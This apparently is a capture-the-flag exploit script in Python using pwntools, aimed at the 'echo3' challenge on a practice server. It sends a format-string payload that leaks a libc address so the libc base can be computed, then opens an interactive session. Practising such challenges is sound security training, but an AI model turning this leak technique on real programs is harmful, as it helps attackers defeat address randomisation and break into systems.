#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo3")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo3")
    libc = elf.libc


else:
    io = remote("hackme.inndy.tw", 7720)
    libc = ELF("./libc-2.23.so.i386")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    payload = "%51$p||"
    io.send(payload)
    libcBase = int(io.recvuntil("||", drop = True), 16) - 246 - libc.sym['__libc_start_main']
    if sys.argv[1] == "r":
        libcBase -= 1
    success("libcBase -> {:#x}".format(libcBase))
    pause()
    #  DEBUG("b *0x8048646\nc")
    
    io.interactive()
    io.close()



